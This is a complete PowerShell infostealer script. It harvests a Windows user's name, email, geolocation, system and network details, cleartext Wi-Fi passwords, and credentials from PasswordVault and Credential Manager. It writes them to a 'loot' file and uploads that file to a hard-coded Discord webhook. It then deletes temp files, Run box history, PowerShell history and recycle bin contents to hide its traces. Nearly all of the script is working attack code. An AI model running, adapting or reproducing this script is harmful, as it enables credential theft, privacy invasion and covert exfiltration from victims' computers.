<#
.Synopsis
    Script to read stored credentials from credential manager
    Makes use of CredEnum API
    
.DESCRIPTION
    Script to read stored credentials from credential manager
    Makes use of CredEnum API
    Author : vimalsh@live.com

.EXAMPLE
    Get usernames and passwords from Web Credentials section of credential manager
    Get-PasswordVaultCredentials

.EXAMPLE
    Get usernames and passwords from Windows Credentials section of credential manager
    Get-CredManCreds
#>

if(Test-path ".\FileLogging.ps1")
{
. .\FileLogging.ps1
} else {
    # Redefine as this
    Function Write-LogFileEntry ($message, $Level, $IncludeErrorVar, $ClearErrorAfterLogging, $DoNotPrintToScreen )
    {
        Write-host $message
    }
}

function Get-PasswordVaultCredentials {
    $CRED_MANAGER_CREDS_LST = @()

    try
    {
        #Load the WinRT projection for the PasswordVault
        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $Script:vault =  new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
        $Results = $Script:vault.RetrieveAll()
        foreach($credentry in  $Results)
        {
                $credobject = $Script:vault.Retrieve( $credentry.Resource, $credentry.UserName )
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credobject.UserName)"                  
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$($credobject.Resource)" # URI need to be sanitised
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$($credobject.Password)" 
                $CRED_MANAGER_CREDS_LST += $obj                
        }
    }
    catch
    {
        Write-LogFileEntry "Failed to instantiate passwordvault class. $($_.InvocationInfo.PositionMessage)"
    }
    return $CRED_MANAGER_CREDS_LST
}

function Compile-Csharp ()
{
    param(
    [String] $code, 
    [Array] $References
    )

    $cp = new-object Microsoft.CSharp.CSharpCodeProvider
    $framework = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())

    # Optional Array of Reference assemblies to be added
    $refs = New-Object Collections.ArrayList
    $refs.AddRange( @("${framework}\System.dll"))
    if ($references.Count -ge 1)
    {
        $refs.AddRange($References)
    }

    $cpar = New-Object System.CodeDom.Compiler.CompilerParameters
    $cpar.GenerateInMemory = $true
    $cpar.GenerateExecutable = $false
    $cr = $cp.CompileAssemblyFromSource($cpar, $code)

    if ( $cr.Errors.Count)
    {
        $codeLines = $code.Split("`n");
        foreach ($ce in $cr.Errors)
        {
            Write-LogFileEntry "Error: $($codeLines[$($ce.Line - 1)])" -DoNotPrintToScreen
            $ce |out-default
        }
        Throw "INVALID DATA: Errors encountered while compiling code"
    }
}

Function Get-CredManCreds()
{
    $CredEnumWrapperClass = 
@'
using System;
using System.Runtime.InteropServices;

namespace CredEnum {

        public enum CRED_FLAGS : uint {
            NONE = 0x0,
            PROMPT_NOW = 0x2,
            USERNAME_TARGET = 0x4
        }

        public enum CRED_ERRORS : uint {
            ERROR_SUCCESS = 0x0,
            ERROR_INVALID_PARAMETER = 0x80070057,
            ERROR_INVALID_FLAGS = 0x800703EC,
            ERROR_NOT_FOUND = 0x80070490,
            ERROR_NO_SUCH_LOGON_SESSION = 0x80070520,
            ERROR_BAD_USERNAME = 0x8007089A
        }

        public enum CRED_PERSIST : uint {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3
        }

        public enum CRED_TYPE : uint {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,
            MAXIMUM_EX = 1007
        }
        
        //-- [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct Credential {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public DateTime LastWritten;
            public UInt32 CredentialBlobSize;
            public string CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

        //-- [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct NativeCredential {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public UInt32 CredentialBlobSize;
            public IntPtr CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

    //-- For Safehandling of pointer to pointer of a non-blittable type
    public class CriticalCredentialHandle : Microsoft.Win32.SafeHandles.CriticalHandleZeroOrMinusOneIsInvalid
    {
        public CriticalCredentialHandle(IntPtr preexistingHandle)
        {
            SetHandle(preexistingHandle);
        }

        private Credential TranslateNativeCred(IntPtr pCred)
        {
            NativeCredential ncred = (NativeCredential)Marshal.PtrToStructure(pCred, typeof(NativeCredential));
            Credential cred = new Credential();
            cred.Type = ncred.Type;
            cred.Flags = ncred.Flags;
            cred.Persist = (CRED_PERSIST)ncred.Persist;

            long LastWritten = ncred.LastWritten.dwHighDateTime;
            LastWritten = (LastWritten << 32) + ncred.LastWritten.dwLowDateTime;
            cred.LastWritten = DateTime.FromFileTime(LastWritten);
            cred.UserName = ncred.UserName;
            cred.TargetName = ncred.TargetName;
            cred.TargetAlias = ncred.TargetAlias;
            cred.Comment = ncred.Comment;
            cred.CredentialBlobSize = ncred.CredentialBlobSize;
            
            if (0 < ncred.CredentialBlobSize)
            {
                cred.CredentialBlob = Marshal.PtrToStringUni(ncred.CredentialBlob, (int)ncred.CredentialBlobSize / 2);
            }

            return cred;
        }

        public Credential GetCredential()
        {
            if (IsInvalid)
            {
                throw new InvalidOperationException("Invalid CriticalHandle!");
            }
            Credential cred = TranslateNativeCred(handle);
            return cred;
        }

        public Credential[] GetCredentials(int count)
        {
            if (IsInvalid)
            {
                throw new InvalidOperationException("Invalid CriticalHandle!");
            }

            Credential[] Credentials = new Credential[count];
            IntPtr pTemp = IntPtr.Zero;
            for (int inx = 0; inx < count; inx++)
            {
                pTemp = Marshal.ReadIntPtr(handle, inx * IntPtr.Size);
                Credential cred = TranslateNativeCred(pTemp);
                Credentials[inx] = cred;
            }
            return Credentials;
        }

        override protected bool ReleaseHandle()
        {
            if (IsInvalid)
            {
                return false;
            }
            //CredFree(handle);
            SetHandleAsInvalid();
            return true;
        }
    }

    //-- wrapper for CredEnumerate() winAPI 
    public class CredEnumerator {

        //-- Defining some of the types we will use for this code

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerate")]
        public static extern bool CredEnumerate([In] string Filter, [In] int Flags, out int Count, out IntPtr CredentialPtr);        

        public static Credential[] CredEnumApi(string Filter)
        {
            int count = 0;
            int Flags = 0x0;
            IntPtr pCredentials = IntPtr.Zero;

            if (string.IsNullOrEmpty(Filter) || "*" == Filter)
            {
                Filter = null;
                if (6 <= Environment.OSVersion.Version.Major)
                {
                    Flags = 0x1; //CRED_ENUMERATE_ALL_CREDENTIALS; only valid is OS >= Vista
                }
            }

            if (CredEnumerate(Filter, Flags, out count, out pCredentials))
            {
                //--allocate credentials array
                CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredentials);
                Credential[] Credentials = new Credential[count];
                
                Credentials = CredHandle.GetCredentials(count);

                for (int inx = 0; inx < count; inx++)
                {
                    Credential curr = Credentials[inx];                
                }                 
                return Credentials;
            }

            return null; 
        }

    } //-- end of public class CredEnumerator 

} //-- end of namespace CredEnum 
'@

    $CRED_MANAGER_CREDS_LST = @()

    try {
        # Attempt to create an instance of this class
        Compile-CSharp $CredEnumWrapperClass            
    }
    catch {
        Write-LogFileEntry "Error during compilation. $error " | Out-Null
        $error.clear()
        return $CRED_MANAGER_CREDS_LST
    }

    $Results = [CredEnum.CredEnumerator]::CredEnumApi("")
    foreach ($credentry in $Results) 
    {
        $HostName = $credentry.TargetName
        $HostName = $HostName.ToLower()
        $ServiceName = $credentry.Type
        $UserName = $credentry.UserName
        $DomainName = ""
        $includethis = $True

        try 
        {
            if ($HostName -match "termsrv/") {                  
                $HostName = $HostName.Substring($HostName.IndexOf("termsrv/"))                  
                $ServiceName = "RDP"    
                $includethis = $True       
            }
            elseif ( ($HostName -match "http://(.*)") -or ($HostName -match "https://(.*)")) {
                $HostName = $matches[1] 
                $ServiceName = "HTTP"      
                $includethis = $True            
            }
            elseif ($HostName -match "ftp://(.*)") {
                $HostName = $matches[1] 
                $ServiceName = "FTP"    
                $includethis = $True       
            }
            elseif ( ($HostName -match "domain:target=(.*)") ) {
                $HostName = $matches[1]   
                $ServiceName = "SMB"       
                $includethis = $True           
            }
            elseif ( ($HostName -match "microsoftoffice(.*)") ) {
                $ServiceName = "Outlook"                     
                $includethis = $True           
            }
            else {
                $HostName = $credentry.TargetName
                $ServiceName = $($credentry.Type)
                $includethis = $true
            }

            if ($credentry.UserName -match "@(.*)") {
                $DomainName = $matches[1]
                $UserName = $UserName.Substring(0, $UserName.IndexOf("@"))
            }
            elseif ($credentry.UserName -match "\\(.*)") {
                $DomainName = $UserName.Substring(0, $UserName.IndexOf("\\"))
                $UserName = $matches[1]
            }
            else {
                $UserName = $($credentry.UserName)
                $DomainName = ""
            }

            if ($credentry.CredentialBlob -match "^.{1,20}$") {
                $Password = $credentry.CredentialBlob
            }
            else { 
                $Password = ""
            }

            if (($includethis -eq $true) -and (![string]::IsNullOrEmpty($UserName))) {
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credentry.UserName)"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Domain" -value "$DomainName"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$HostName"
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$Password"
                $CRED_MANAGER_CREDS_LST += $obj 
            }
        }
        catch {
            Write-LogFileEntry "Unexpected Exception!"
        }                   

    }

    return $CRED_MANAGER_CREDS_LST
} 

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
    catch {
        Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }

    return $fullName 
}

$FN = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {
        $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
        return $email
    }

    catch {
        Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

$EM = Get-email

#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current locaton

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }  

        if ($GeoWatcher.Permission -eq 'Denied'){
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
        }
    }
    catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}

$GL = Get-GeoLocation

############################################################################################################################################################

# Get nearby wifi networks

try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
} catch {
    $NearbyWifi = "No nearby wifi networks detected"
}

############################################################################################################################################################

# Get info about PC

# Get IP / Network Info
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error getting Public IP"
}

$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}

$IsDHCPEnabled = $false
$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
foreach ($Network in $Networks) {
    if($network.DHCPEnabled) {
        $IsDHCPEnabled = $true
    }
}

$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

############################################################################################################################################################

# Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement

$computerOs = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}}, @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List

$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table

############################################################################################################################################################

# Get HDDs
$driveType = @{
    2 = "Removable disk "
    3 = "Fixed local disk "
    4 = "Network disk "
    5 = "Compact disk "
}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }

# Get COM & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table

# Check RDP
$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
    $RDP = "RDP is Enabled" 
} else {
    $RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get wifi SSIDs and Passwords    
$WLANProfileNames = @()
# Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
# Trim the output to receive only the name
Foreach($WLANProfileName in $Output) {
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects = @()
# Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames) {
    try {
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    } catch {
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

$Networks = @{
    NetworkInterfaces = $Network | Out-String
    WLANProfiles = $WLANProfileObjects | Out-String
}

############################################################################################################################################################

# Local-user
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID

# Process first
$process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
        "LocalAddress" = $listenerItem.LocalAddress
        "RemoteAddress" = $listenerItem.RemoteAddress
        "State" = $listenerItem.State
        "AppliedSetting" = $listenerItem.AppliedSetting
        "OwningProcess" = $listenerItem.OwningProcess
        "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 

# Process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine

# Service
$service = Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName

# Installed software (get uninstaller)
$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize

# Drivers
$drivers = Get-WmiObject Win32_PnPSignedDriver | where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion

# Videocard
$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

############################################################################################################################################################

# Get Credentials from PasswordVault and CredMan
$PasswordVaultCreds = Get-PasswordVaultCredentials | Format-Table -AutoSize | Out-String
$CredManCreds = Get-CredManCreds | Format-Table -AutoSize | Out-String

############################################################################################################################################################

# MAKE LOOT FOLDER 

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

############################################################################################################################################################

# OUTPUTS RESULTS TO LOOT FILE

Clear-Host
Write-Host 

echo "Name:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $FN >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Email:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $EM >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "GeoLocation:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $GL >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Nearby Wifi:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $NearbyWifi >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
$computerSystem.Name >> $env:TMP\$FileName
"==================================================================
Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
"Model: " + $computerSystem.Model >> $env:TMP\$FileName
"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName

"OS:
=================================================================="+ ($computerOs | out-string) >> $env:TMP\$FileName

"CPU:
=================================================================="+ ($computerCpu | out-string) >> $env:TMP\$FileName

"RAM:
==================================================================
Capacity: " + $computerRamCapacity + ($computerRam | out-string) >> $env:TMP\$FileName

"Mainboard:
=================================================================="+ ($computerMainboard | out-string) >> $env:TMP\$FileName

"Bios:
=================================================================="+ (Get-WmiObject win32_bios | out-string) >> $env:TMP\$FileName

"Local-user:
=================================================================="+ ($luser | out-string) >> $env:TMP\$FileName

"HDDs:
=================================================================="+ ($Hdds | out-string) >> $env:TMP\$FileName

"COM & SERIAL DEVICES:
=================================================================="+ ($COMDevices | out-string) >> $env:TMP\$FileName

"Network: 
==================================================================
Computers MAC address: " + $MAC >> $env:TMP\$FileName
"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
"RDP: " + $RDP >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
($Networks.NetworkInterfaces) >> $env:TMP\$FileName

"W-Lan profiles: 
=================================================================="+ ($Networks.WLANProfiles) >> $env:TMP\$FileName

"Listeners / ActiveTcpConnections
=================================================================="+ ($listener | out-string) >> $env:TMP\$FileName

"Current running process: 
=================================================================="+ ($process | out-string) >> $env:TMP\$FileName

"Services: 
=================================================================="+ ($service | out-string) >> $env:TMP\$FileName

"Installed software:
=================================================================="+ ($software | out-string) >> $env:TMP\$FileName

"Installed drivers:
=================================================================="+ ($drivers | out-string) >> $env:TMP\$FileName

"Installed videocards:
=================================================================="+ ($videocard | out-string) >> $env:TMP\$FileName

"PasswordVault Credentials:
=================================================================="+ $PasswordVaultCreds >> $env:TMP\$FileName

"CredMan Credentials:
=================================================================="+ $CredManCreds >> $env:TMP\$FileName

############################################################################################################################################################

# Recon all User Directories
tree $Env:userprofile /a /f >> $env:TMP\$FileName

############################################################################################################################################################

# Remove Variables

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,process,service,software,drivers,videocard,
vault -ErrorAction SilentlyContinue -Force

############################################################################################################################################################

# Upload output file to Discord

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'https://discord.com/api/webhooks/1250802056105558116/z5UHXDrxDZSFN3uRp8mXIAONqGdGhYhM42rbAqRVq6Fas1pXeYsS04VcUpke9IzI5FME'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Call the Upload-Discord function to send the file and text
Upload-Discord -file "$env:TMP\$FileName" -text "Recon data collected from $env:USERNAME's computer"

############################################################################################################################################################

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell; $done.Popup("script is done", 1)
